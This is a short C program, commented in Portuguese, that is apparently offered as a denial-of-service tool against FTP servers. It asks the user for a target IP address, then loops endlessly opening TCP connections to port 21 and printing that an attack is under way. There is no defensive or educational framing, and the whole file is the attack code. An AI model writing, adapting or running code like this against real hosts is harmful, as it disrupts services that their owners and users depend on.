#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>

// DoS para um servico FTP -> Normalmente utilizado na porta 21

int main (void) {

int ip_target;
int myconnect;
char destiny[16];

struct sockaddr_in target;

printf("Digite o IP para realizar o DoS: ");
fgets(destiny,16,stdin);
destiny[strcspn(destiny, "\n")] = 0;

while(1) {

	ip_target = socket(AF_INET, SOCK_STREAM,0);
	target.sin_addr.s_addr = inet_addr(destiny);
	target.sin_family = AF_INET;

	target.sin_port = htons(21);
	myconnect = connect(ip_target, (struct sockaddr *)&target, sizeof target);

	if (myconnect == 0 ) {
		printf("\nAtaque DoS sendo realizado.");

		}
	}
	close(myconnect);
	return 0;
}
